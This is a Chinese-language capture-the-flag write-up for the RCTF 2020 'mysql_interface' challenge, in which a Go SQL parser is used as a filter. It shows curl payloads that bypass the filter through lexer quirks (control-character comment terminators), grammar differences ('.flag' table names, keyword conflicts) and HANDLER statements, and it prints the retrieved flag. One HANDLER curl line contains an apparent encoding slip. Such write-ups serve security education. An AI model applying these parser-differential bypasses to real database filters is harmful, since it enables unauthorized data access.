# mysql_interface

[English version](README.md)

## 题目描述

https://mysql-interface.rctf2020.rois.io

```go
import (
    "github.com/pingcap/parser"                     // v3.1.2-0.20200507065358-a5eade012146+incompatible
    _ "github.com/pingcap/tidb/types/parser_driver" // v1.1.0-beta.0.20200520024639-0414aa53c912
)

var isForbidden = [256]bool{}

const forbidden = "\x00\t\n\v\f\r`~!@#$%^&*()_=[]{}\\|:;'\"/?<>,\xa0"

func init() {
    for i := 0; i < len(forbidden); i++ {
        isForbidden[forbidden[i]] = true
    }
}

func allow(payload string) bool {
    if len(payload) < 3 || len(payload) > 128 {
        return false
    }
    for i := 0; i < len(payload); i++ {
        if isForbidden[payload[i]] {
            return false
        }
    }
    if _, _, err := parser.New().Parse(payload, "", ""); err != nil {
        return true
    }
    return false
}

// do query...
```

## 解题思路

题目接收一个有限字符集的SQL语句，并且需要绕过一个MySQL解析器的分析，不过该解析器在词法或者语法方面都存在多种绕过。

### 打破词法解析

通过阅读[mysql-server lexer](https://github.com/mysql/mysql-server/blob/5.7/sql/sql_lex.cc#L1424)的源码，不难发现它支持以'--'开头，并以标记为`_MY_SPC`或`_MY_CTR`的字符为结尾风格的行注释，而本题使用的解析器却使用了[unicode.IsSpace()](https://pkg.go.dev/unicode?tab=doc#IsSpace)来鉴别空格。这导致两者在词法解析层面的不一致，我们可以利用这一点绕过词法解析。


| 字符                                                  | MySQL Server       | Parser      |
| :---------------------------------------------------- | ------------------ | ----------- |
| 0x01 - 0x08, 0x15 - 0x19                              | _MY_CTR            | 不识别      |
| 0x14                                                  | _MY_SPC            | 不识别      |
| 0x09 (\t), 0x10 (\n), 0x11 (\v), 0x12 (\f), 0x13 (\r) | _MY_CTR 或 _MY_SPC | Not Allowed |
| 0x20 (space)                                          | _MY_SPC            | Space       |
| 0x85                                                  | Unrecognized       | Space       |
| 0xa0                                                  | 不识别             | Not Allowed |

上表列举了一些两者存在解析不一致的字符，如果你想找到更多字符，这些链接可能对你有用：

- [Character Definition Arrays](https://dev.mysql.com/doc/refman/5.7/en/character-arrays.html)
- [MySQL Server Source Code Charsets](https://github.com/mysql/mysql-server/tree/5.7/sql/share/charsets)

至此，我们可以很容易地打破词法解析器，从而绕过解析拿到flag，下面列举一些特殊的例子，

1. `\x01` 不被本题的解析器允许放在`--`之后，然而MySQL服务器却允许

   ```shell
   $ echo "select flag from flag--\x01"
   select flag from flag--
   $ curl https://mysql-interface.rctf2020.rois.io --data "sql=select%20flag%20from%20flag--%01&pow=000"
   RCTF{jUst_bYp@ss_a_mysql_parser_b6bdde}
   ```

2. `\x85` 被本题的解析器允许放在`--`之后，然而MySQL服务器却不允许

```shell
$ echo "select flag from flag --\x85tbl where --\x85tbl.flag+1"
select flag from flag --�tbl where --�tbl.flag+1
$ curl https://mysql-interface.rctf2020.rois.io --data "sql=select%20flag%20from%20flag%20%85rois%20where%20--%85rois.flag%2b1&pow=000"
RCTF{jUst_bYp@ss_a_mysql_parser_b6bdde}
```

### 打破语法分析

除了词法解析外，在语法分析层面也存在多个绕过。通过对比本题解析器的[yacc源码](https://github.com/pingcap/parser/blob/master/parser.y)和MySQL Server的[yacc源码](https://github.com/mysql/mysql-server/blob/5.7/sql/sql_yacc.yy)，不难发现，二者存在着显著的差异，这让我们在语法分析层面绕过异常简单。

#### 表名（Table Factor）

MySQL Server源码中允许的表名如下所示：

```yacc
// copied from https://github.com/mysql/mysql-server/blob/5.7/sql/sql_yacc.yy#L13059

table_ident:
    ident
    | ident '.' ident
    | '.' ident
    ;
```

但是在解析器中却存在着点不同：

```yacc
// copied from https://github.com/pingcap/parser/blob/master/parser.y#L6765

TableName:
    Identifier
    |	Identifier '.' Identifier
    ;

```

两者之间的差别，让我们可以直接绕过语法解析

```shell
$ echo "select flag from .flag"
select flag from .flag
$ curl https://mysql-interface.rctf2020.rois.io --data "sql=select%20flag%20from%20.flag&pow=000"
RCTF{jUst_bYp@ss_a_mysql_parser_b6bdde}
```

#### 关键字冲突（Keyword Conflicts）

当分析两个解析器差异时，关键字冲突永远是最容易发现的，而且一定会出现。由于有太多的方式来发现关键字冲突，这里只列举一个抛砖引玉。

由于MySQL源码与本题所使用的解析器，有着不同的关键字，而且标识符的属性也存在差异。题目的解析器所使用的关键字可以在[这里](https://github.com/pingcap/parser/blob/master/misc.go#L138)找到大部分。直接把关键字逐个提供给解析器分析，就能找到很多绕过的方法，如下：

- "select flag EXCEPT from flag"
- "select flag NVARCHAR from flag"
- "select flag CURRENT_ROLE from flag"
- "select flag PRE_SPLIT_REGIONS from flag"
- "select flag ROW from flag"
- "select flag ERROR from flag"
- "select flag PACK_KEYS from flag"
- "select flag SHARD_ROW_ID_BITS from flag"

```shell
$ echo "select flag EXCEPT from flag"
select flag EXCEPT from flag
$ curl https://mysql-interface.rctf2020.rois.io --data "sql=select%20flag%20EXCEPT%20from%20flag&pow=000"
RCTF{jUst_bYp@ss_a_mysql_parser_b6bdde}
```

### 非预期解

在比赛期间，天枢用了[HANDLER Statement](https://dev.mysql.com/doc/refman/5.7/en/handler.html)（我完全没想到的方式）成功绕过解析，并且拿到了三血！

```shell
$ echo "handler flag open" && echo "handler flag read first" && echo "handler flag close"
handler flag open
handler flag read first
handler flag close
$ curl https://mysql-interface.rctf2020.rois.io --data "sql=handler%20flag%20open&pow=000"
Empty set
$ curl https://mysql-interface.rctf2020.rois.io --data "sql=handler%20flag%20read%20first&pow=000"
RCTF{jUst_bYp@ss_a_mysql_parser_b6bdde}
$ curl https://mysql-interface.rctf2020.rois.io --data "sql=handler%20flag%29close&pow=000"
Empty set
```

最后，不只是上文提到的这些，该解析器中还存在很多很多绕过的地方...

## 感谢你的参与，期待明年RCTF2021再见！